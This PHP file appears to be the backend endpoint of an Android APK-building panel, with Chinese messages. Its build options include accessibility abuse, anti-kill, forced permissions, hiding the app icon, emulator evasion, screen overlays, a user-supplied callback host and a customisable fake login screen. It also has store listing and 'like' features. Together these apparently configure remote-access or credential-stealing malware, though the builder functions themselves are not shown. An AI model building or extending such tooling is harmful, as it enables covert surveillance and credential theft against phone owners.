<?php

//this called to start building apk
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Content-Type: application/json");

// OPTIONS 预检请求直接返回
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit();
}
require_once 'Eaod14881.php';

require_once 'Eaod65501.php';

function isValidAppVersion($version)
{
    // Define the regular expression pattern
    $pattern = '/^\d+(\.\d+){0,2}$/';

    // Use preg_match to check if the version matches the pattern
    if (preg_match($pattern, $version)) {
        return true;
    } else {
        return false;
    }
}

function isValidApkPackageName($packageName)
{
    // Updated pattern to allow only letters, digits, and dots
    $pattern = '/^[a-zA-Z]([a-zA-Z0-9]*[a-zA-Z0-9]+)?(\.[a-zA-Z]([a-zA-Z0-9]*[a-zA-Z0-9]+)?)+$/';

    // Check if the package name matches the pattern
    return preg_match($pattern, $packageName) === 1;
}

session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'));

    if (!empty($data->email) && !empty($data->token) && !empty($data->subcom)) {

        try {
            $user_email = isset($data->email) ? urldecode($data->email) : 'empty';
            $user_token = isset($data->token) ? urldecode($data->token) : 'empty';
            $Sub_Command = isset($data->subcom) ? urldecode($data->subcom) : 'empty';

            list($isValid, $message) = SessionCheck($user_email, $user_token);

            if (!$isValid) {

                echo Format("认证失败 $message", OP_Fail);
                exit();
            }
            // 连接数据库
            $conn = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name . ";charset=utf8mb4", DB_UserName, DB_Password);
            $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

            // 解码用户提供的电子邮件和令牌
            $user_email = urldecode($user_email);
            $user_token = urldecode($user_token);

            // 将解码后的字符串中的空格替换回 '+'
            $user_email = str_replace(' ', '+', $user_email);
            $user_token = str_replace(' ', '+', $user_token);

            // 使用 REPLACE 函数处理数据库中的数据
            $stmt = $conn->prepare("
    SELECT userid, email 
    FROM users 
    WHERE REPLACE(email, ' ', '+') = :email 
    AND token = :token 
    AND token_expiration >= NOW()
");

            $stmt->bindParam(':email', $user_email);
            $stmt->bindParam(':token', $user_token);
            $stmt->execute();

            $result = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($result) {
                $userid = $result['userid'];
                $useremail = $result['email'];

                try {
                    $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name . ";charset=utf8mb4", DB_UserName, DB_Password);
                    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

                    switch ($Sub_Command) {
                        case 'build':
                            $app_id = isset($data->appid) ? urldecode($data->appid) : null;
                            $clientname = isset($data->cname) ? urldecode($data->cname) : null;
                            $buildtype = isset($data->btype) ? urldecode($data->btype) : null;

                            $allowed_btype = array("S", "C");
                            if (!in_array($buildtype, $allowed_btype)) {
                                echo Format("未知的构建类型。", OP_Fail);
                                exit();
                            }

                            $allowed_values = array("0", "1");
                            $use_access = isset($data->uaccess) ? (in_array($data->uaccess, $allowed_values) ? urldecode($data->uaccess) : null) : null;
                            $use_antkill = isset($data->ukill) ? (in_array($data->ukill, $allowed_values) ? urldecode($data->ukill) : null) : null;
                            $use_atoprims = isset($data->uprims) ? urldecode(string: $data->uprims) : null;
                            $user_allprims = isset($data->allprims) ? (in_array($data->allprims, $allowed_values) ? urldecode($data->allprims) : null) : null;
                            $user_blackprims = isset($data->blackprims) ? (in_array($data->blackprims, $allowed_values) ? urldecode($data->blackprims) : null) : null;
                            if (
                                $app_id === null ||
                                $clientname === null ||
                                $use_access === null ||
                                $use_antkill === null ||
                                $use_atoprims === null
                            ) {
                                echo Format("无效参数(99)。", OP_Fail);
                                exit();
                            }

                            if (strlen($clientname) > 16) {
                                echo Format('客户名称不能超过16个字符', OP_Fail);
                                die();
                            }

                            if (!isValidApkPackageName($app_id)) {
                                echo Format('应用ID不被接受。', OP_Fail);
                                die();
                            }
                            //发布
                            $userhost = isset($data->uhost) ? urldecode($data->uhost) : "null";

                            $userhost = strtolower($userhost);
                            $userhost = preg_replace('/^(https?:\/\/)?(www\.)?/', '', $userhost);

                            $notifytitle = isset($data->nottitle) ? urldecode($data->nottitle) : " ";
                            $notifymsg = isset($data->notmsg) ? urldecode($data->notmsg) : " ";

                            switch ($buildtype) {
                                case 'C':
                                    $appname = isset($data->appname) ? urldecode($data->appname) : null;
                                    if (strlen($appname) > 32) {
                                        echo Format('应用名称不能超过23个字符', OP_Fail);
                                        die();
                                    }

                                    $appversion = isset($data->appversion) ? urldecode($data->appversion) : null;
                                    if (!isValidAppVersion($appversion)) {
                                        echo Format('应用版本不被接受', OP_Fail);
                                        die();
                                    }

                                    $appicopath = isset($data->icoid) ? urldecode($data->icoid) : null;
                                    $parts = explode('.', $appicopath);
                                    if (count($parts) !== 2) {
                                        echo Format("图标名称无效！", OP_Request);
                                        exit();
                                    }

                                    $filename = $parts[0];
                                    $extension = $parts[1];

                                    if ($extension !== 'png') {
                                        echo Format("图标名称无效！！", OP_Request);
                                        exit();
                                    }

                                    if (!preg_match('/^[a-f0-9]{32}$/', $filename)) {
                                        echo Format("图标名称无效！！！", OP_Request);
                                        exit();
                                    }

                                    $userDirectory = '../user/storage/' . $userid . '/icons/';

                                    if (!file_exists($userDirectory . $appicopath)) {
                                        echo Format("未找到该图标", OP_Fail);
                                        exit();
                                    }

                                    $appurl = isset($data->appurl) ? urldecode($data->appurl) : null;


                                    $logintitle = isset($data->logt) ? urldecode($data->logt) : null;
                                    $logindis = isset($data->logd) ? urldecode($data->logd) : null;
                                    $loginbtn = isset($data->logb) ? urldecode($data->logb) : null;
                                    $lngshort = isset($data->loglng) ? urldecode($data->loglng) : null;
                                    $hiddenapp = isset($data->hidapp) ? urldecode($data->hidapp) : "0";
                                    $noemulator = isset($data->noemu) ? urldecode($data->noemu) : "0";
                                    $installtype = isset($data->accsstyp) ? urldecode($data->accsstyp) : "g";
                                    $hide_type = isset($data->hidtype) ? urldecode($data->hidtype) : "null";
                                    $use_draw = isset($data->usedraw) ? urldecode($data->usedraw) : "null";
                                    $open_access = isset($data->openaccess) ? urldecode($data->openaccess) : "null";
                                    $descr_iption = isset($data->description) ? urldecode($data->description) : "null";                                 
                                    $diao_type = isset($data->diaotype) ? urldecode($data->diaotype) : "0";  
                                    echo BuildCustom(
                                        $app_id,
                                        $userid,
                                        $clientname,
                                        $useremail,
                                        "empty",
                                        "empty",
                                        $userhost,
                                        $use_access,
                                        $use_antkill,
                                        $use_atoprims,
                                        $notifytitle,
                                        $notifymsg,
                                        $user_allprims,
                                        $user_blackprims,
                                        $buildtype,
                                        $appname,
                                        $appversion,
                                        $appicopath,
                                        $appurl,
                                        $logintitle,
                                        $logindis,
                                        $loginbtn,
                                        $lngshort,
                                        $hiddenapp,
                                        $noemulator,
                                        $installtype,
                                        $hide_type,
                                        $use_draw,
                                        $open_access,
                                        $descr_iption,
                                        $diao_type
                                    );
                                    break;

                                case 'S':
                                    $appCheckQuery = "SELECT main_activity, app_folder FROM store WHERE app_id = :appid";
                                    $appCheckStmt = $pdo->prepare($appCheckQuery);
                                    $appCheckStmt->bindValue(':appid', $app_id, PDO::PARAM_STR);
                                    $appCheckStmt->execute();
                                    $result = $appCheckStmt->fetch(PDO::FETCH_ASSOC);

                                    if (!$result) {
                                        echo Format("错误：应用ID不存在。", OP_Fail);
                                        exit();
                                    }

                                    $mainActivity = $result['main_activity'];
                                    $app_folder = $result['app_folder'];

                                    $lngshort = isset($data->loglng) ? urldecode($data->loglng) : null;


                                    $appname = isset($data->appname) ? urldecode($data->appname) : null;
                                    if (strlen($appname) > 32) {
                                        echo Format('应用名称不能超过23个字符', OP_Fail);
                                        die();
                                    }

                                    $appversion = isset($data->appversion) ? urldecode($data->appversion) : null;
                                    if (!isValidAppVersion($appversion)) {
                                        echo Format('应用版本不被接受', OP_Fail);
                                        die();
                                    }

                                    $appicopath = isset($data->icoid) ? urldecode($data->icoid) : null;


                                    $appurl = isset($data->appurl) ? urldecode($data->appurl) : null;


                                    $logintitle = isset($data->logt) ? urldecode($data->logt) : null;
                                    $logindis = isset($data->logd) ? urldecode($data->logd) : null;
                                    $loginbtn = isset($data->logb) ? urldecode($data->logb) : null;
                                    $lngshort = isset($data->loglng) ? urldecode($data->loglng) : null;
                                    $hiddenapp = isset($data->hidapp) ? urldecode($data->hidapp) : "0";
                                    $noemulator = isset($data->noemu) ? urldecode($data->noemu) : "0";
                                    $installtype = isset($data->accsstyp) ? urldecode($data->accsstyp) : "g";
                                    $hide_type = isset($data->hidtype) ? urldecode($data->hidtype) : "null";
                                    $use_draw = isset($data->usedraw) ? urldecode($data->usedraw) : "null";
                                    $open_access = isset($data->openaccess) ? urldecode($data->openaccess) : "null";
                                    $descr_iption = isset($data->description) ? urldecode($data->description) : "null";                                 
                                    $diao_type= isset($data->diaotype) ? urldecode($data->diaotype) : "0";  

                                    echo BuildStore(
                                        $app_id,
                                        $userid,
                                        $clientname,
                                        $useremail,
                                        $mainActivity,
                                        $app_folder,
                                        $userhost,
                                        $use_access,
                                        $use_antkill,
                                        $use_atoprims,
                                        $notifytitle,
                                        $notifymsg,
                                        $user_allprims,
                                        $user_blackprims,
                                        $buildtype,
                                        $appname,
                                        $appversion,
                                        $appicopath,
                                        $appurl,
                                        $logintitle,
                                        $logindis,
                                        $loginbtn,
                                        $lngshort,
                                        $hiddenapp,
                                        $noemulator,
                                        $installtype,
                                        $hide_type,
                                        $use_draw,
                                        $open_access,
                                        $descr_iption,
                                        $diao_type
                                    );
                                    break;
                                default:
                                    echo Format("未知的构建类型 (2)。", OP_Fail);
                                    break;
                            }
                            break;

                        case 'load':
                            $query = "SELECT * FROM store";
                            $stmt = $pdo->prepare($query);
                            $stmt->execute();

                            $result = $stmt->fetchAll(PDO::FETCH_ASSOC);

                            header('Content-Type: application/json');
                            echo Format($result, OP_Success);

                            // $result = [];
                            // header('Content-Type: application/json');
                            // echo Format($result, OP_Success);

                            break;

                        case 'like':
                            $app_id = isset($data->appid) ? urldecode($data->appid) : null;
                            if ($app_id == null) {
                                echo Format("无效参数。", OP_Fail);
                                exit();
                            }

                            $appCheckQuery = "SELECT COUNT(*) AS count FROM store WHERE app_id = :appid";
                            $appCheckStmt = $pdo->prepare($appCheckQuery);
                            $appCheckStmt->bindValue(':appid', $app_id, PDO::PARAM_STR);
                            $appCheckStmt->execute();
                            $result = $appCheckStmt->fetch(PDO::FETCH_ASSOC);

                            if ($result['count'] == 0) {
                                echo Format("错误：应用ID不存在。", OP_Fail);
                                exit();
                            }

                            $checkdoublecate = "SELECT COUNT(*) AS counts FROM store_likes WHERE app_id = :appid AND user_id = :uuid";
                            $checkdouble = $pdo->prepare($checkdoublecate);
                            $checkdouble->bindValue(':uuid', $userid, PDO::PARAM_INT);
                            $checkdouble->bindValue(':appid', $app_id, PDO::PARAM_STR);
                            $checkdouble->execute();
                            $resultdouble = $checkdouble->fetch(PDO::FETCH_ASSOC);

                            if ($resultdouble['counts'] > 0) {
                                echo Format("您已经点赞过该应用。", OP_Request);
                                exit();
                            }

                            $likequery = "INSERT INTO store_likes (like_id, user_id, app_id) VALUES (NULL, :user_id, :appid)";
                            $stmt = $pdo->prepare($likequery);
                            $stmt->bindValue(':user_id', $userid, PDO::PARAM_INT);
                            $stmt->bindValue(':appid', $app_id, PDO::PARAM_STR);
                            if ($stmt->execute()) {
                                echo Format("点赞成功。", OP_Success);
                            } else {
                                echo Format("点赞失败。", OP_Fail);
                            }
                            break;
                        default:
                            echo Format("无效的请求 (2)。", OP_Fail);
                            break;
                    }
                } catch (PDOException $e) {
                    logError($e);
                    echo Format("错误 (8946)。", OP_Fail);
                    exit();
                }
            } else {
                echo Format("无效或已过期的令牌。", OP_Fail);
            }
        } catch (PDOException $e) {
            echo Format('出错了，请稍后再试 (908)。', OP_Fail);
            logError($e);
            echo Format("错误 (4434)。", OP_Fail);
        }
        $conn = null;
    } else {
        echo Format("无效的请求参数。", OP_Fail);
    }
} else {
    echo Format("无效的请求。", OP_Fail);
}
